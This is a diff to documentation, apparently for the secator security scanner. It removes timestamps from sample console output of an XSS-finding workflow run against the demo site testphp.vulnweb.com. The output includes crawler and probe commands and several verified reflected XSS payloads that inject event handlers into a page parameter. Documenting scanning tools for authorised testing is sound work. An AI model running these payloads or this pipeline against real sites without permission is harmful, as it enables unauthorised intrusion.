@@ -29,7 +29,7 @@ We'll save our results to a `.txt` file:
 
                     freelabz.com
 
-[13:34:53] katana -silent -jc -js-crawl -known-files all -u http://testphp.vulnweb.com -json -concurrency 50                                                                                                                                _base.py:614
+katana -silent -jc -js-crawl -known-files all -u http://testphp.vulnweb.com -json -concurrency 50                                                                                                                                _base.py:614
 🔗 http://testphp.vulnweb.com [200] [Nginx:1.19.0, PHP:5.6.40, Ubuntu, DreamWeaver]
 🔗 http://testphp.vulnweb.com/high [404] [Nginx:1.19.0]
 🔗 http://testphp.vulnweb.com/index.php
@@ -98,7 +98,7 @@ secator x httpx /home/vagrant/.secator/reports/default/tasks/task_katana_target_
 
                     freelabz.com
 
-[13:19:35] httpx -silent -td -asn -cdn -l /tmp/httpx_2023_07_04-01_19_35_686343_PM.txt -json -threads 50 -match-code 200,301,500                                                                                                            _base.py:614
+httpx -silent -td -asn -cdn -l /tmp/httpx_2023_07_04-01_19_35_686343_PM.txt -json -threads 50 -match-code 200,301,500                                                                                                            _base.py:614
 🔗 http://testphp.vulnweb.com/showimage.php?file [200] [nginx/1.19.0] [Nginx:1.19.0, PHP:5.6.40, Ubuntu] [image/jpeg] [196]
 🔗 http://testphp.vulnweb.com/hpp [200] [HTTP Parameter Pollution Example] [nginx/1.19.0] [Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [203]
 🔗 http://testphp.vulnweb.com/cart.php [200] [you cart] [nginx/1.19.0] [DreamWeaver, Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [4903]
@@ -173,7 +173,7 @@ secator x dalfox http://testphp.vulnweb.com/hpp/?pp=12
 
                     freelabz.com
 
-[13:41:28] dalfox --silence url 'http://testphp.vulnweb.com/hpp/?pp=12' --format json --worker 50                                                                                                                                           _base.py:614
+dalfox --silence url 'http://testphp.vulnweb.com/hpp/?pp=12' --format json --worker 50                                                                                                                                           _base.py:614
 🚨 [Verified XSS] [high] http://testphp.vulnweb.com/hpp/ [CWE-83] [inject_type:inATTR-double(3)-URL, poc_type:plain, method:GET, 
 data:http://testphp.vulnweb.com/hpp/?pp=12%22id%3Dx+tabindex%3D1+style%3D%22display%3Ablock%3Btransition%3Aoutline+1s%3B%22+ontransitionend%3Dalert.apply%28null%2C1%29+class%3Ddalfox+, param:pp, payload:"id=x tabindex=1 
 style="display:block;transition:outline 1s;" ontransitionend=alert.apply(null,1) class=dalfox , evidence:4 line:  ms.php?p=valid&pp=12"id=x tabindex=1 style="display:block;transition:outline 1s;, message_id:1103, message_str:Triggered XSS Payload 
@@ -206,10 +206,12 @@ You don't have to specify any additional flag than when running normally, since 
 <summary>Command output</summary>
 
 ```
-[13:50:29] katana -silent -jc -js-crawl -known-files all -u http://testphp.vulnweb.com -json -concurrency 50                                                                                                                                _base.py:614
-[13:50:43] httpx -silent -td -asn -cdn -l /tmp/httpx_2023_07_04-01_50_43_044323_PM.txt -json -threads 50                                                                                                                                    _base.py:614
-[13:50:49] cat /tmp/gf_2023_07_04-01_50_49_787397_PM.txt | gf xss                                                                                                                                                                           _base.py:614
-[13:50:49] dalfox --silence file /tmp/dalfox_2023_07_04-01_50_49_855768_PM.txt --format json --worker 50                                                                                                                                    _base.py:614
+katana -silent -jc -js-crawl -known-files all -u http://testphp.vulnweb.com -json -concurrency 50                                                                                                                                _base.py:614
+...
+httpx -silent -td -asn -cdn -l /tmp/httpx_2023_07_04-01_50_43_044323_PM.txt -json -threads 50                                                                                                                                    _base.py:614
+...
+cat /tmp/gf_2023_07_04-01_50_49_787397_PM.txt | gf xss                                                                                                                                                                           _base.py:614
+dalfox --silence file /tmp/dalfox_2023_07_04-01_50_49_855768_PM.txt --format json --worker 50                                                                                                                                    _base.py:614
 🚨 [Verified XSS] [high] http://testphp.vulnweb.com/hpp/ [CWE-83] [inject_type:inATTR-double(3)-URL, poc_type:plain, method:GET, 
 data:http://testphp.vulnweb.com/hpp/?pp=12%22%26%2339%3B%3E%3Caudio+controls+ondurationchange%3Dprompt%281%29+id%3Ddalfox%3E%3Csource+src%3D1.mp3+type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E, param:pp, payload:"&#39;><audio controls 
 ondurationchange=prompt(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>, evidence:4 line:  ms.php?p=valid&pp=12"&#39;><audio controls ondurationchange=prompt(1) id=dalfox>, message_id:1862, message_str:Triggered XSS Payload (found DOM 
@@ -273,27 +275,10 @@ secator w xss_finder.yaml http://testphp.vulnweb.com
  (__  /  __/ /__/ /_/ / /_/ /_/ / /    
 /____/\___/\___/\__,_/\__/\____/_/     v0.0.1
 
-                    freelabz.com
-
-╭────── Workflow xss_finder ──────╮
-│ 📜 Description: XSS Finder      │
-│ 👷 Workspace: default           │
-│ 🍐 Targets:                     │
-│    • http://testphp.vulnweb.com │
-│ 📌 Options:                     │
-│    • threads: 50                │
-│    • headless: False            │
-│    • system_chrome: False       │
-│    • follow_redirect: False     │
-│    • debug_resp: False          │
-│ ✉  Exporters:                   │
-│    • json                       │
-│    • csv                        │
-╰─────────────────────────────────╯
-[14:03:31] 🎉 Workflow xss_finder starting...                                                                                                                                                                                               _base.py:614
+                    freelabz.com                                                                                                                                                                                               _base.py:614
 
 🔧 Crawling root URL ...
-[14:03:32] katana -silent -jc -js-crawl -known-files all -u http://testphp.vulnweb.com -json -concurrency 50                                                                                                                                _base.py:614
+katana -silent -jc -js-crawl -known-files all -u http://testphp.vulnweb.com -json -concurrency 50                                                                                                                                _base.py:614
 🔗 http://testphp.vulnweb.com [200] [Nginx:1.19.0, Ubuntu, PHP:5.6.40, DreamWeaver]
 🔗 http://testphp.vulnweb.com/high [404] [Nginx:1.19.0]
 🔗 http://testphp.vulnweb.com/Mod_Rewrite_Shop/ [200] [Nginx:1.19.0, Ubuntu, PHP:5.6.40]
@@ -332,7 +317,7 @@ secator w xss_finder.yaml http://testphp.vulnweb.com
 🔗 http://testphp.vulnweb.com/search.php?test=query [200] [Nginx:1.19.0, Ubuntu, DreamWeaver, PHP:5.6.40]
 
 🔧 Finding alive URLs ...
-[14:03:45] httpx -silent -td -asn -cdn -l /tmp/httpx_2023_07_04-02_03_45_807367_PM.txt -json -threads 50                                                                                                                                    _base.py:614
+httpx -silent -td -asn -cdn -l /tmp/httpx_2023_07_04-02_03_45_807367_PM.txt -json -threads 50                                                                                                                                    _base.py:614
 🔗 http://testphp.vulnweb.com/Templates/high [404] [404 Not Found] [nginx/1.19.0] [Nginx:1.19.0] [text/html] [153]
 🔗 http://testphp.vulnweb.com/index.php [200] [Home of Acunetix Art] [nginx/1.19.0] [DreamWeaver, Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [4958]
 🔗 http://testphp.vulnweb.com/comment.php?aid=2 [200] [comment on artist] [nginx/1.19.0] [Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [1252]
@@ -341,20 +326,18 @@ secator w xss_finder.yaml http://testphp.vulnweb.com
 🔗 http://testphp.vulnweb.com/listproducts.php?cat=3 [200] [pictures] [nginx/1.19.0] [DreamWeaver, Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [4699]
 
 🔧 Identifying XSS ...
-[14:03:52] cat /tmp/gf_2023_07_04-02_03_52_398624_PM.txt | gf xss                                                                                                                                                                           _base.py:614
+cat /tmp/gf_2023_07_04-02_03_52_398624_PM.txt | gf xss                                                                                                                                                                           _base.py:614
 🏷️ [xss] http://testphp.vulnweb.com/comment.php?aid=1 []
 🏷️ [xss] http://testphp.vulnweb.com/comment.php?aid=2 []
 🏷️ [xss] http://testphp.vulnweb.com/comment.php?aid=3 []
 🏷️ [xss] http://testphp.vulnweb.com/hpp/?pp=12 []
 
 🔧 Verifying XSS ...
-[14:03:54] dalfox --silence file /tmp/dalfox_2023_07_04-02_03_52_411553_PM.txt --format json --worker 50                                                                                                                                    _base.py:614
+dalfox --silence file /tmp/dalfox_2023_07_04-02_03_52_411553_PM.txt --format json --worker 50                                                                                                                                    _base.py:614
 🚨 [Verified XSS] [high] http://testphp.vulnweb.com/hpp/ [CWE-83] [inject_type:inATTR-double(3)-URL, poc_type:plain, method:GET, 
 data:http://testphp.vulnweb.com/hpp/?pp=12%22onmouseenter%3Dprompt.call%28null%2C1%29+class%3Ddalfox+, param:pp, payload:"onmouseenter=prompt.call(null,1) class=dalfox , evidence:4 line:  ms.php?p=valid&pp=12"onmouseenter=prompt.call(null,1) 
 class=dalfox ">link2</a><b, message_id:1540, message_str:Triggered XSS Payload (found DOM Object): pp="onmouseenter=prompt.call(null,1) class=dalfox ]
-
-
-[14:04:20] 🎉 Workflow xss_finder succeeded in 48 seconds.                                                                                                                                                                                  _base.py:614
+                                                                                                                                                                                  _base.py:614
 🗄 Saved JSON report to /home/vagrant/.secator/reports/default/workflows/workflow_xss_finder_2023_07_04-02_04_20_160856_PM.json
 🗄 Saved CSV reports to 
    • /home/vagrant/.secator/reports/default/workflows/workflow_xss_finder_target_2023_07_04-02_04_20_160856_PM.csv
